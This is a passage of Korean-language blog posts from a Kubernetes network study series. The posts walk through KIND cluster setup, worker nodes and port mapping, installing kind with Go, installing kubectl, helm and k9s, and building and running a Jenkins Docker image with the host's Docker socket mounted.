kkumtree kkumtree 4096 Sep 3 21:31 /home/kkumtree/.kube drwxr-x--- 4 kkumtree kkumtree 4096 Sep 3 21:11 /home/kkumtree/.kube/cache drwxr-x--- 5 kkumtree kkumtree 4096 Sep 3 21:28 /home/kkumtree/.kube/cache/discovery drwxr-x--- 3 kkumtree kkumtree 4096 Sep 3 21:28 /home/kkumtree/.kube/cache/http KIND용 $KUBECONFIG 설정:\n그래서 아래처럼, 경로를 만들고 $KUBECONFIG 환경변수를 설정해주었습니다.\nmkdir -p ~/.kind export KUBECONFIG=~/.kind/kubeconfig (참고) 과거에 변수로 좀 곯머리를 앓았다보니, 쉘스크립팅 예제를 짜봤습니다.\nhttps://github.com/kkumtree/kans/blob/week2/kind-basic/kubeconfig_manager.sh\n❯ pwd /home/kkumtree/Documents/github/kans/kind-basic ❯ ll total 4.0K -rwxrwxr-x 1 kkumtree kkumtree 1.1K Sep 2 22:49 kubeconfig_manager.sh ❯ . ./kubeconfig_manager.sh ============================== | kubeconfig manager for kind ------------------------------ | $HOME: $$/home/kkumtree$$ | $KUBECONFIG: $$$$ ============================== (Press Enter to confirm OR type custom path) kubeconfig for kind [/home/kkumtree/.kind/kubeconfig]: env KUBECONFIG is set to: $$/home/kkumtree/.kind/kubeconfig$$ ❯ . ./kubeconfig_manager.sh env KUBECONFIG is unset 1. KIND 첫 구동 KIND는 이름 값대로 컨테이너 이미지를 사용합니다.\n그래서, 이미지가 로컬에 없다면 받는데 시간이 소요됩니다.\n❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE kindest/node v1.30.4 ea9c94202240 2 weeks ago 991MB 새로운 터미널을 한 쪽에 열어, 어떻게 작동하는지 살펴보기 위한 준비를 합니다.\nwatch kubectl get pod -A --sort-by=.metadata.creationTimestamp 사용 이미지 지정: kindest/node:v1.30.4\n최신버전인 v1.31은 앞으로 적용해볼 서비스들과 호환성을 위해, 버전을 낮춰서 사용합니다.\n❯ kind create cluster --image kindest/node:v1.30.4 Creating cluster \u0026#34;kind\u0026#34; ... ✓ Ensuring node image (kindest/node:v1.30.4) 🖼 ✓ Preparing nodes 📦 ✓ Writing configuration 📜 ✓ Starting control-plane 🕹️ ✓ Installing CNI 🔌 ✓ Installing StorageClass 💾 Set kubectl context to \u0026#34;kind-kind\u0026#34; You can now use your cluster with: kubectl cluster-info --context kind-kind Thanks for using kind! 😊 아래와 같이, control-plane pod 내부에 pod가 순차적으로 올라오는 것을 볼 수 있습니다.\n(phase.1) etcd/apiserver/controller-manager/scheduler 가 먼저 올라옵니다.\n(phase.2) coredns/kube-proxy 그리고 kindnet, local path provisioner 가 설치됩니다.\n앞에서 다른 터미널로 2초마다 watch로 갱신하도록 시켜둔 상태\n❯ watch kubectl get pod -A --sort-by=.metadata.creationTimestamp NAMESPACE NAME READY STATUS RESTARTS AGE kube-system etcd-kind-control-plane 1/1 Running 0 7m5s kube-system kube-apiserver-kind-control-plane 1/1 Running 0 7m5s kube-system kube-controller-manager-kind-control-plane 1/1 Running 0 7m5s kube-system kube-scheduler-kind-control-plane 1/1 Running 0 7m5s kube-system coredns-7db6d8ff4d-dtgmb 1/1 Running 0 6m51s kube-system coredns-7db6d8ff4d-zfsp2 1/1 Running 0 6m51s kube-system kindnet-4l5v8 1/1 Running 0 6m51s kube-system kube-proxy-gt6fw 1/1 Running 0 6m51s local-path-storage local-path-provisioner-7d4d9bdcc5-pw5b2 1/1 Running 0 6m51s 구동 상태에서 kubeconfig 파일은 다음과 같은 구조로 내용을 담고 있음을 알 수 있습니다.\n❯ cat ~/.kind/kubeconfig apiVersion: v1 clusters: - cluster: certificate-authority-data: \u0026lt;base64encoded\u0026gt; server: https://127.0.0.1:40305 name: kind-kind contexts: - context: cluster: kind-kind user: kind-kind name: kind-kind current-context: kind-kind kind: Config preferences: {} users: - name: kind-kind user: client-certificate-data: \u0026lt;base64encoded\u0026gt; client-key-data: \u0026lt;base64encoded\u0026gt; Control Plane 대상으로 nginx 배포 테스트: Taint가 걸려있지 않아, 정상적으로 배포\nkubectl run nginx --image=nginx:stable-alpine kkumtree@kkumtree-G1619-04:~$ kubectl get pod -owide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES nginx 1/1 Running 0 23s 10.244.0.5 kind-control-plane \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kubectl describe node kkumtree@kkumtree-G1619-04:~$ kubectl describe node | grep Taints Taints: \u0026lt;none\u0026gt; 클러스터를 삭제한 후, kubeconfig 파일을 확인해보면, 상세 값들이 지워졌음을 확인할 수 있습니다.\n❯ kind delete cluster Deleting cluster \u0026#34;kind\u0026#34; ... Deleted nodes: [\u0026#34;kind-control-plane\u0026#34;] ❯ cat ~/.kind/kubeconfig apiVersion: v1 kind: Config preferences: {} 2. kindnet? local-path-provisioner? 는 무엇인가? 문득, 이 두 가지는 뭘까? 하고 위험한 궁금증이 생겨 찾아봤습니다. (1) kindnet GitHub/kindnet의 내용을 요약하면,\n현재, KIND의 기본 CNI 플러그인 모든 클러스터 노드가 동일한 서브넷에 속한 환경에서만 작동 임베디드 ipmasq(IP매스커레이드) 에이전트 IPv6를 지원하는 CNI플러그인이 부족한 상황에서 개발됨 또한 TKNG에서는 Reachability(도달성)과 Connectivity(연결성)관점에서 CNI 플러그인으로서의 요건 충족을 설명하고 있었습니다.\n(2) local-path-provisioner GitHub/local-path-provisioner: SUSE의 RANCHER에서 관리하고 있다는 것을 처음 인지하였습니다.\n또한 그냥 로컬PV랑 똑같은거 아니야?라고 하기엔 사소한(?) 오해가 있었습니다.\nk8s에서 기본으로 지원하는, Local Persistent Volume 보다 간단한 솔루션 사용자 구성에 따라 hostPath 또는 local 기반의 PV를 노드에 자동으로 생성 (단점)볼륨 용량 제한을 둘 수 없음. 값이 설정되어있더라도 무시 3. Worker 노드 추가해보기 앞에서는 각 Node 구성을 위한 컨테이너 이미지 로컬 저장 겸 구성요소를 살펴보았으니,\nControl Plane 외에도 Worker Node를 추가하여 구성을 해봅니다.\n기존의 KIND 클러스터는 종료해둔 상태입니다. : kind delete cluster\n1개의 Control Plane과1개의 Worker Node를 구성하는 config를 설정해봅니다.\ncat \u0026lt;\u0026lt; YML \u0026gt; ~/.kind/kind-config-1-1.yml apiVersion: kind.x-k8s.io/v1alpha4 kind: Cluster nodes: - role: control-plane - role: worker YML kind create cluster --config ~/.kind/kind-config-1-1.yml --name kindful # ✓ Preparing nodes 📦 📦 # 해당 라인에서 Node Pod를 2개 이상 준비함을 볼 수 있습니다. Worker Node에 kindnet과 kube-proxy가 올라갔음을 알 수 있습니다. (제일 나중에 구동)\nkkumtree@kkumtree-G1619-04:~$ kubectl get pod -owide -n kube-system | grep kindful-worker kindnet-wcgg4 1/1 Running 0 2m12s 172.18.0.3 kindful-worker \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-proxy-hxwjf 1/1 Running 0 2m12s 172.18.0.3 kindful-worker \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kkumtree@kkumtree-G1619-04:~$ kubectl get pod -owide -n kube-system | grep kindful-worker kindnet-wcgg4 1/1 Running 0 2m12s 172.18.0.3 kindful-worker \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-proxy-hxwjf 1/1 Running 0 2m12s 172.18.0.3 kindful-worker \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kkumtree@kkumtree-G1619-04:~$ kubectl get pod -A --sort-by=.metadata.creationTimestamp NAMESPACE NAME READY STATUS RESTARTS AGE kube-system etcd-kindful-control-plane 1/1 Running 0 3m27s kube-system kube-apiserver-kindful-control-plane 1/1 Running 0 3m27s kube-system kube-controller-manager-kindful-control-plane 1/1 Running 0 3m27s kube-system kube-scheduler-kindful-control-plane 1/1 Running 0 3m27s kube-system coredns-6f6b679f8f-5bnhz 1/1 Running 0 3m20s kube-system coredns-6f6b679f8f-tp89q 1/1 Running 0 3m20s kube-system kindnet-lwp7n 1/1 Running 0 3m20s kube-system kube-proxy-wb9bq 1/1 Running 0 3m20s local-path-storage local-path-provisioner-57c5987fd4-jdg5m 1/1 Running 0 3m20s kube-system kindnet-wcgg4 1/1 Running 0 3m19s kube-system kube-proxy-hxwjf 1/1 Running 0 3m19s Worker Node도 함께 생성시, Control Plane에 Taints 정보가 있음을 알 수 있습니다.\nkkumtree@kkumtree-G1619-04:~$ kubectl describe node | grep Taints Taints: node-role.kubernetes.io/control-plane:NoSchedule Taints: \u0026lt;none\u0026gt; 클러스터 삭제 시에는 생성시 지정했던 클러스터 이름을 지정해야합니다.\nkkumtree@kkumtree-G1619-04:~$ kind delete cluster --name kindful Deleting cluster \u0026#34;kindful\u0026#34; ... Deleted nodes: [\u0026#34;kindful-control-plane\u0026#34; \u0026#34;kindful-worker\u0026#34;] 4. Port Mapping 과 샘플 서비스 시연 모두 시연을 좋아하니까..!(터덜) 샘플 웹서비스으로 어떻게 표시 되는지 확인해봅니다.\n(1) Port Mapping 결국, 각 노드는 Docker Container이기에 평소 하던 것처럼 포트를 열어주면 됩니다.\n워커노드에 31000번 부터 부여해볼 것이며, NodePort 설정과 비슷하다고 보면 좋을 것 같습니다.\n(참고) 포트는 31000번대부터 사용가능합니다. 에러코드에서도 확인 가능합니다. Host ▶ Container Service 31000 - 32000 kube-ops-view(helm) 31001 - 32001 nginx:stable-alpine cat \u0026lt;\u0026lt; YML \u0026gt; ~/.kind/kind-config-1-2.yml apiVersion: kind.x-k8s.io/v1alpha4 kind: Cluster nodes: - role: control-plane - role: worker extraPortMappings: - containerPort: 32000 hostPort: 31000 # listenAddress: \u0026#34;0.0.0.0\u0026#34; # Default (Opt.) # protocol: tcp # Default (Also Opt.) - containerPort: 32001 hostPort: 31001 YML kind create cluster --config ~/.kind/kind-config-1-2.yml --name bueno # ✓ Preparing nodes 📦 📦 # 해당 라인에서 Node Pod를 2개 이상 준비함을 볼 수 있습니다. (2) kube-ops-view (hostPort: 31000) Helm 설치가 되어있어야 합니다. Config YAML에서 지정한대로 컨테이너 포트를 맞춰줘야합니다.\nhelm repo add geek-cookbook https://geek-cookbook.github.io/charts/ helm install kube-ops-view geek-cookbook/kube-ops-view --version 1.2.2 --set service.main.type=NodePort,service.main.ports.http.nodePort=32000 --set env.TZ=\u0026#34;Asia/Tokyo\u0026#34; --namespace kube-system 아래와 같이 잘 설치되었는지, 확인합니다. kubectl get deploy,pod,svc,ep -n kube-system -l app.kubernetes.io/instance=kube-ops-view echo -e \u0026#34;KUBE-OPS-VIEW URL = http://localhost:31000/#scale=2\u0026#34; (3) Nginx (hostPort:31001) Deployment 및 Service 배포로 합니다.\ncat \u0026lt;\u0026lt;EOF | kubectl create -f - apiVersion: apps/v1 kind: Deployment metadata: name: deploy-helloworld spec: replicas: 2 selector: matchLabels: app: deploy-helloworld template: metadata: labels: app: deploy-helloworld spec: terminationGracePeriodSeconds: 0 containers: - name: deploy-helloworld image: nginx:stable-alpine ports: - containerPort: 80 --- apiVersion: v1 kind: Service metadata: name: deploy-helloworld spec: ports: - name: svc-webport port: 80 targetPort: 80 nodePort: 32001 selector: app: deploy-helloworld type: NodePort EOF 아래 두 가지 방법 중 아무거나 입력하여 확인합니다.\nopen은 설정된 기본 웹브라우저에서, curl은 Terminal 환경일 때 사용하면 됩니다.\nopen http://localhost:31001 curl -s localhost:31001 | grep -o \u0026#34;\u0026lt;title\u0026gt;.*\u0026lt;/title\u0026gt;\u0026#34; # \u0026lt;title\u0026gt;Welcome to nginx!\u0026lt;/title\u0026gt; (4) 서비스 제거 및 종료 kubectl delete deploy,svc deploy-helloworld helm uninstall kube-ops-view -n kube-system kind delete cluster -n bueno ","date":"2024-09-03T21:16:07+09:00","permalink":"https://blog.minseong.xyz/post/kans-2w-kind-overview/","section":"post","tags":["kans","kind","kubernetes"],"title":"KIND 톺아보기"},{"categories":null,"contents":" Helm 설치 추가\nCloudNet@에서 진행하고 있는 K8s Advanced Network Study(이하, KANS)에 참여하게 되면서 기록을 남기고 있습니다.\n이번에는 kind(Kubernetes IN Docker)를 Golang을 통해 설치하면서 약간의 소?란이 있었던 부분만 다룹니다.\n1. KIND란? 아래 사진으로 대체합니다. 자세한 내용은 Docs/Initial_design에서 볼수 있습니다. 2. KIND 설치하기 Docs/Quick-start를 참고합니다. Linux의 경우, 패키지 관리자 설치가 없어 바이너리, 혹은 소스로 설치해야 합니다.\n아래 두 문장에 뭔가 발동하여 Go 언어로 설치를 해보기로 했습니다.\nIf you are a go developer you may find the go install option convenient. Otherwise we supply downloadable release binaries, community-managed packages, and a source installation guide. 3. 설치는 매우 간단 Go 개발자는 아니지만, 잘 깔려있었고 그 GOPATH 환경변수도 확인됩니다. 무슨일이람. ❯ go version go version go1.22.2 linux/amd64 ❯ go env GOPATH /home/kkumtree/go Docs를 잘 읽고, 아래와 같이 설치하면 됩니다. go install sigs.k8s.io/kind@v0.24.0 4. 이걸로 끝 일리가 없다. 환경변수 설정 그런 건 존재하지 않습니다. Go를 개발에 사용해본 적이 없으면 아래처럼 Go 바이너리가 PATH 환경변수에 설정합니다. ❯ env | grep go PATH=/home/kkumtree/go/bin:/home/kkumtree/.tfenv/bin:/home/kkumtree/.tfenv/bin:/home/kkumtree/.tfenv/bin:/home/kkumtree/.sdkman/candidates/java/current/bin:/home/kkumtree/.nvm/versions/node/v18.15.0/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/snap/bin (a안) ~/.bashrc에 정적 지정 보통 이렇게하면, 사용하는데 별 문제가 없습니다. echo \u0026#39;export PATH=$PATH:/home/kkumtree/go/bin\u0026#39; \u0026gt;\u0026gt; ~/.bashrc # zsh일 경우) exec bash source ~/.bashrc # zsh일 경우, 다시 zsh로 복귀) exec zsh (b안) ~/.profile에 동적 지정 별다른 이유는 없고, profile에 조건 설정이 되어있어서 추가해보았습니다. 마지막 3줄만 추가로 작성 # ❯ cat ~/.profile # ~/.profile: executed by the command interpreter for login shells. # This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login # exists. # see /usr/share/doc/bash/examples/startup-files for examples. # the files are located in the bash-doc package. # the default umask is set in /etc/profile; for setting the umask # for ssh logins, install and configure the libpam-umask package. #umask 022 # if running bash if [ -n \u0026#34;$BASH_VERSION\u0026#34; ]; then # include .bashrc if it exists if [ -f \u0026#34;$HOME/.bashrc\u0026#34; ]; then . \u0026#34;$HOME/.bashrc\u0026#34; fi fi # set PATH so it includes user\u0026#39;s private bin if it exists if [ -d \u0026#34;$HOME/bin\u0026#34; ] ; then PATH=\u0026#34;$HOME/bin:$PATH\u0026#34; fi # set PATH so it includes user\u0026#39;s private bin if it exists if [ -d \u0026#34;$HOME/.local/bin\u0026#34; ] ; then PATH=\u0026#34;$HOME/.local/bin:$PATH\u0026#34; fi # set PATH so it includes user\u0026#39;s gopath if it exists if [ -x \u0026#34;/usr/bin/go\u0026#34; ] \u0026amp;\u0026amp; [ -d \u0026#34;$(/usr/bin/go env GOPATH)/bin\u0026#34; ] ; then PATH=\u0026#34;$(/usr/bin/go env GOPATH)/bin:$PATH\u0026#34; fi source ~/.profile로 적용한 후, kind version으로 설치 확인.\n❯ source ~/.profile ❯ kind version kind v0.24.0 go1.22.2 linux/amd64 5. 그 이외의 툴 설치 kubectl: kubernetes Docs.\n아래 방법말고도, sudo snap kubectl --classic 한 줄만으로도 설치 가능합니다. ## Debian-based distributions sudo apt-get update # apt-transport-https may be a dummy package; if so, you can skip that package sudo apt-get install -y apt-transport-https ca-certificates curl gnupg # If the folder `/etc/apt/keyrings` does not exist, it should be created before the curl command, read the note below. # sudo mkdir -p -m 755 /etc/apt/keyrings curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.31/deb/Release.key | sudo gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpg sudo chmod 644 /etc/apt/keyrings/kubernetes-apt-keyring.gpg # allow unprivileged APT programs to read this keyring # This overwrites any existing configuration in /etc/apt/sources.list.d/kubernetes.list echo \u0026#39;deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] https://pkgs.k8s.io/core:/stable:/v1.31/deb/ /\u0026#39; | sudo tee /etc/apt/sources.list.d/kubernetes.list sudo chmod 644 /etc/apt/sources.list.d/kubernetes.list # helps tools such as command-not-found to work correctly sudo apt-get update sudo apt-get install -y kubectl k9s: Snapcraft/k9s.\n전에 다른 분이 알록달록 잘 쓰셔서 한 번 설치해보았습니다. sudo snap install k9s helm: Helm Docs #From Apt (Debian/Ubuntu).\nk8s를 편하게 쓰고자하는 일종의 레포지토리입니다. curl https://baltocdn.com/helm/signing.asc | gpg --dearmor | sudo tee /usr/share/keyrings/helm.gpg \u0026gt; /dev/null # sudo apt-get install apt-transport-https --yes # Use If error occurs echo \u0026#34;deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/helm.gpg] https://baltocdn.com/helm/stable/debian/ all main\u0026#34; | sudo tee /etc/apt/sources.list.d/helm-stable-debian.list sudo apt-get update sudo apt-get install helm ","date":"2024-09-02T00:33:19+09:00","permalink":"https://blog.minseong.xyz/post/kans-2w-kind-installation-on-linux/","section":"post","tags":["kans","installation","kind","golang","kubernetes"],"title":"리눅스에 KIND 설치하기 w/golang"},{"categories":null,"contents":"최근 CloudNet@에서 진행하고 있는 K8s Advanced Network Study(이하, KANS)에 참여하게 되었습니다.\n난이도를 생각하면 KH(Hardcore)NS가 더 맞아보이지만\u0026hellip;\nk8s가 워낙 인기가 많기도 하지만, Pod 간 통신에는 많은 지식이 투여되기에 이번 기회에 살펴보기로 했습니다.\n첫 주차는, 바로 Kubernetes에 진입하지 않고 Containerization에 대한 이해를 먼저 다뤄주셨습니다.\n여타 쿠버네티스 강의와 달리 9주 간 매주 일요일에만 진행되는 세션인데도, 기반 기술을 다시 짚어주셔서 감사했습니다.\n1. AWS EC2 Instance 셋업 CloudFormation을 통해, EC2 및 제반사항을 구성하여 주셨습니다만, 취미 삼아 Terraform 변환 작업을 해보았습니다. 하지 말았어야했는데\u0026hellip; LoL\ncf2tf 툴이 많이 개선된 거 같아, 이번 기회에 다시 사용해보았으나 잘못 구성해준 사항을 고치느라 오히려 시간이 많이 소요되었습니다. 처음부터 직접 구성하는게 더 빠르지 않았을 까란 생각도 들었고 현 시점에서 멱등성이 제대로 구현이 안되서 께름칙합니다만, 아래 링크에서 확인할 수 있습니다. 시간이 허락해준다면 *.auto.tfvars 에 대해서는 별도의 포스팅으로 다룰 수 있도록 해보겠습니다.\n[Github/kans]: Branch week1(dc37074). Output만 변경했는데도, 인스턴스 교체가 이루어지는 사소한 이슈가 있습니다. 그리고 인바운드 규칙은 나중에 수정하셔야하는 부분입니다. AWS 웹콘솔에서 Launch Instance 기본값과 크게 다른 사항은 Root ENI에 Subnet 대역 내의 Private IP를 고정 할당해주는 것이었습니다.\n2. Docker 셋업 근래에는 Docker가 당연하다시피 되어 참 다행(과연\u0026hellip;?)이라고 생각하는데, 개인용으로 Docker는 Snapcraft로 쓰는지라 이때부터 험난했습니다;\nUbuntu에 Docker를 설치하지 않았다면 아래처럼 안내를 보실 수 있을텐데,\nsnap과 podman-docker 설명 외에는 Docker Docs를 보시기를 권장합니다.\nubuntu@MyServer:~/kans$ docker network create kankins Command \u0026#39;docker\u0026#39; not found, but can be installed with: sudo snap install docker # version 24.0.5, or sudo apt install docker.io # version 24.0.7-0ubuntu2~22.04.1 sudo apt install podman-docker # version 3.4.4+ds1-1ubuntu1.22.04.2 See \u0026#39;snap info docker\u0026#39; for additional versions. 설치 방법 Docker Docs One-click Shell Scripting: 세상 좋아졌네요.. EC2에는 이걸로 설치했습니다. APT Repository: 보통은 이걸 세팅합니다. Snapcraft/Docker 설치했다면 Docker 사용자에게 권한상승을 해줘야, 귀찮은 sudo를 생략할 수 있습니다.\n말은 즉슨, 개인용이니 어느정도는 감안하셔서 사용하시면 된다는 의미이지요. 각 방법 별 권한상승 방법은 아래와 같습니다.\n스터디을 진행해주신 gasida님의 말씀대로 해당 세션을 빠져나온(Logout) 후 다시 접속해야합니다.\n세상에 안되는게 어딨어하고 좀 찾아보니 하위 쉘을 열면 어느 정도 가능해보이는데, 스터디 하다가 꼬이면 다시 테라폼 올려야해서 그냥 로그아웃했습니다; 이 부분 궁금하신 분은 reference의 stackoverflow를 참고해주세요.\n# (0) One-click Installation curl -fsSL https://get.docker.com -o get-docker.sh sudo sh get-docker.sh # (1) APT based sudo groupadd docker sudo usermod -aG docker $USER newgrp docker ## Logout and Login Needed for session # (2) Snap based sudo addgroup --system docker sudo adduser $USER docker newgrp docker sudo snap disable docker sudo snap enable docker 3. Jenkins 이미지를 구워서 올려보자 이번 세션에서 제일 쉬워보이는 과제였는데, 매번 픽이 이상한 거 같습니다. 취미 빼고 Jenkins를 마지막으로 다뤄본게 2년 전이라, 겸사겸사 이정도면 눈감고 하겠지~ 했는데 사소한게 바뀐거 같아서 시간이 많이 소요되었습니다.\n사소한 것 목록 Documentation Base Image: Debian 2 Ubuntu 별도로, DockerHub는 Official 이미지는 6년도 지났겠다. Deprecated 명시를 떠나, Prune 한번만 해줬으면 좋겠습니다.\n(0) Document 유의사항 Jenkins가 다 좋은데, 신규 유저용 공식문서 링크만 던져주기에는 살짝 미묘한 점이 있습니다.\nOn macOS and Linux의 (4)항에서 Debian을 베이스로 하지만, 이는 최신버전에서는 적용이 되지 않습니다.\n작성일 기준으로 jenkins/jenkins:lts-jdk17 이미지를 사용 시, Ubuntu 베이스로 변경되었습니다.\n무슨 사연이 있는지는 모르겠지만, 당연히 GPG 키사이닝 값이 다르니 터지는\u0026hellip;\nDinD 주제도 같이 다뤄보려고 했다가 시간이 부족해져서, 기본적인 부분만 다뤄보겠습니다.\n(1) 브릿지 생성 및 Dockerfile 작성 Docs대로라면 이렇게 만들어야 될 겁니다. 하지만, 기본값의 네트워크를 쓰는 것은 보통 권장사항은 아니며, 나중에 브릿지가 궁금하시면 [Docker Docs#Use user-defined bridge networks] 참고하시면 됩니다. 특히 Dockerfile 작성 부분에서 혼을 담아 설명해주셔서, 글 한번 읽고 아 Docker가 그랬었지하고 넘어갈 수 있었습니다. # 1-1. Bridge Network docker network create kankins # 1-2. Dockerfile cat \u0026lt;\u0026lt;EOF\u0026gt;Dockerfile FROM jenkins/jenkins:lts-jdk17 USER root RUN apt-get update \u0026amp;\u0026amp; apt-get install -y lsb-release RUN curl -fsSLo /usr/share/keyrings/docker.asc \\ https://download.docker.com/linux/ubuntu/gpg RUN echo \u0026#34;deb [arch=$(dpkg --print-architecture) \\ signed-by=/usr/share/keyrings/docker.asc] \\ https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) stable\u0026#34; \u0026gt; /etc/apt/sources.list.d/docker.list RUN apt-get update \u0026amp;\u0026amp; apt-get install -y docker-ce-cli USER jenkins RUN jenkins-plugin-cli --plugins \u0026#34;blueocean docker-workflow\u0026#34; EOF (2) 이미지 빌드 및 실행 # 2. Build docker build -t kankins-redocean:lts-jdk17-240818 . # 3. Run docker run \\ --name kankins-redocean \\ --restart=on-failure \\ --detach \\ --network kankins \\ --env DOCKER_HOST=tcp://docker:2376 \\ --env DOCKER_CERT_PATH=/certs/client \\ --env DOCKER_TLS_VERIFY=1 \\ --publish 7969:8080 \\ --publish 50000:50000 \\ --volume jenkins-data:/var/jenkins_home \\ --volume jenkins-docker-certs:/certs/client:ro \\ kankins-redocean:lts-jdk17-240818 # 4. Get Initial Password docker exec -it kankins-redocean \\ cat /var/jenkins_home/secrets/initialAdminPassword (3) 자잘한 밑정리 테라폼 코드 변환 중에 인바운드 허용이 막혀있다는 걸, 이때 깨닫고 웹콘솔로 수정\u0026hellip;\n키 입력과 추가 플러그인 설치, 어드민 로그인을 웹페이지로 해야한다는 점이 매우 불안정해보이고, 거슬리는 부분입니다. 여하간 설치가 끝났고 접속은 됩니다. 해보니\u0026hellip; 으-음\n로그가 떠서 행복하군요 :) #ubuntu@MyServer:~/kans$ docker logs da 2\u0026gt;\u0026amp;1 | grep -i SEVERE 2024-09-01 02:08:30.398+0000 [id=32]\tSEVERE\tjenkins.InitReactorRunner$1#onTaskFailed: Failed Loading plugin Token Macro Plugin v400.v35420b_922dcb_ (token-macro) 2024-09-01 02:08:30.400+0000 [id=33]\tSEVERE\tjenkins.InitReactorRunner$1#onTaskFailed: Failed Loading plugin Favorite v2.221.v19ca_666b_62f5 (favorite) 2024-09-01 02:08:30.401+0000 [id=34]\tSEVERE\tjenkins.InitReactorRunner$1#onTaskFailed: Failed Loading plugin REST Implementation for Blue Ocean v1.27.14 (blueocean-rest-impl) 2024-09-01 02:08:30.406+0000 [id=34]\tSEVERE\tjenkins.InitReactorRunner$1#onTaskFailed: Failed Loading plugin GitHub plugin v1.40.0 (github) 2024-09-01 02:08:30.407+0000 [id=34]\tSEVERE\tjenkins.InitReactorRunner$1#onTaskFailed: Failed Loading plugin GitHub Branch Source Plugin v1797.v86fdb_4d57d43 (github-branch-source) 2024-09-01 02:08:30.413+0000 [id=33]\tSEVERE\tjenkins.InitReactorRunner$1#onTaskFailed: Failed Loading plugin Pipeline implementation for Blue Ocean v1.27.14 (blueocean-pipeline-api-impl) 2024-09-01 02:08:30.414+0000 [id=33]\tSEVERE\tjenkins.InitReactorRunner$1#onTaskFailed: Failed Loading plugin Bitbucket Pipeline for Blue Ocean v1.27.14 (blueocean-bitbucket-pipeline) 2024-09-01 02:08:30.416+0000 [id=33]\tSEVERE\tjenkins.InitReactorRunner$1#onTaskFailed: Failed Loading plugin Events API for Blue Ocean v1.27.14 (blueocean-events) 2024-09-01 02:08:30.417+0000 [id=31]\tSEVERE\tjenkins.InitReactorRunner$1#onTaskFailed: Failed Loading plugin Git Pipeline for Blue Ocean v1.27.14 (blueocean-git-pipeline) 2024-09-01 02:08:30.418+0000 [id=33]\tSEVERE\tjenkins.InitReactorRunner$1#onTaskFailed: Failed Loading plugin GitHub Pipeline for Blue Ocean v1.27.14 (blueocean-github-pipeline) 2024-09-01 02:08:30.419+0000 [id=31]\tSEVERE\tjenkins.InitReactorRunner$1#onTaskFailed: Failed Loading plugin Blue Ocean Pipeline Editor v1.27.14 (blueocean-pipeline-editor) 2024-09-01 02:08:30.420+0000 [id=33]\tSEVERE\tjenkins.InitReactorRunner$1#onTaskFailed: Failed Loading plugin Blue Ocean v1.27.14 (blueocean) # ubuntu@MyServer:~/kans$ docker logs da 2\u0026gt;\u0026amp;1 | grep -i missing - Plugin is missing: json-path-api (2.8.0-5.v07cb_a_1ca_738c) https://plugins.jenkins.io/json-path-api/dependencies/ 이후의 내용은 아래에서 수정하면서 다루겠습니다.\n4. 브릿지 없이 해보자\u0026hellip;? docker는 de facto이니, 컨테이너 끄고 이미지 지우는 건 생략(서술 안해도 되서 편하다\u0026hellip;) 별도 생성한 bridge는 더이상 사용하지 않으니, 지워주시면 됩니다. 빠른 실행을 위해, 초기 구동 시 생성된 volume은 삭제하지 않았습니다. 이번에는 브릿지를 생성하지 않고, Host의 Docker 데몬을 사용해보겠습니다.(?) 사실 저도 무슨 말인가 생각하고 있습니다. 보통 거꾸로 아님..?\n(1) Dockerfile 작성 앞서 오류를 알았으니, 포스팅 작성 시점 기준으로 한번 수정해보겠습니다. 수정하고 나니, 위의 오류는 잡았네요.\ncat \u0026lt;\u0026lt;EOF\u0026gt;Dockerfile FROM jenkins/jenkins:lts-jdk17 USER jenkins RUN jenkins-plugin-cli --plugins \\ blueocean \\ docker-workflow \\ antisamy-markup-formatter \\ json-path-api \\ token-macro \\ build-timeout \\ timestamper \\ resource-disposer \\ ws-cleanup \\ ant \\ gradle \\ workflow-aggregator \\ github \\ github-branch-source \\ pipeline-github-lib \\ metrics \\ pipeline-graph-view \\ eddsa-api \\ trilead-api \\ ssh-slaves \\ matrix-auth \\ pam-auth \\ ldap \\ email-ext \\ theme-manager \\ dark-theme EOF 오-옹. CD 한 장에는 절대 넣을 수 없는 웅장한 이미지가 탄생하였습니다! :) # ubuntu@MyServer:~/kans$ docker build -t kankins-redocean:lts-jdk17-240818 . # ubuntu@MyServer:~/kans$ docker images REPOSITORY TAG IMAGE ID CREATED SIZE kankins-redocean lts-jdk17-240818 ecd80984a2ae 23 minutes ago 824MB (2) 컨테이너 실행 브릿지를 사용하지 않는대신, Host의 Docker 런타임의 소켓을 공유해보겠습니다. 구분 Moby Host(From) Container(To) Notes As-is bridge(local) - - Default As-is volume jenkins-docker-certs /certs/client DinD 데몬의 인증서 As-is env - - DOCKER_HOST=tcp://docker:2376 (제거) As-is env - - DOCKER_CERT_PATH=/certs/client (제거) As-is env - - DOCKER_TLS_VERIFY=1 (제거) To-be volume /var/run/docker.sock /var/run/docker.sock Host의 Docker Unix Socket To-be volume /usr/bin/docker /usr/bin/docker Host의 Docker Engine(Client) docker run \\ --name kankins-redocean \\ --restart=on-failure \\ --detach \\ --volume /var/run/docker.sock:/var/run/docker.sock \\ --volume /usr/bin/docker:/usr/bin/docker \\ --publish 7969:8080 \\ --publish 50000:50000 \\ --volume jenkins-data:/var/jenkins_home \\ kankins-redocean:lts-jdk17-240818 (3) Container의 Jenkins 유저에 권한 부여 Host의 Docker 데몬을 사용하려면, Container의 Jenkins 유저에 권한을 부여해야합니다.\n기존의 Dockerfile에서는 Docker TLS 활성화 및 별도의 Docker 볼륨을 물렸지만, 다 내려놓았습니다. # 1. Container의 Docker 소켓의 GID 확인 docker exec --user 0 kankins-redocean stat -c \u0026#39;%g\u0026#39; /var/run/docker.sock # 2. Docker 그룹의 사용자가 Docker 소켓을 사용할 수 있도록 허용 docker exec --user 0 kankins-redocean groupadd -g $(docker exec --user 0 kankins-redocean stat -c \u0026#39;%g\u0026#39; /var/run/docker.sock) docker # 3. Host의 Docker 그룹에 Jenkins 유저 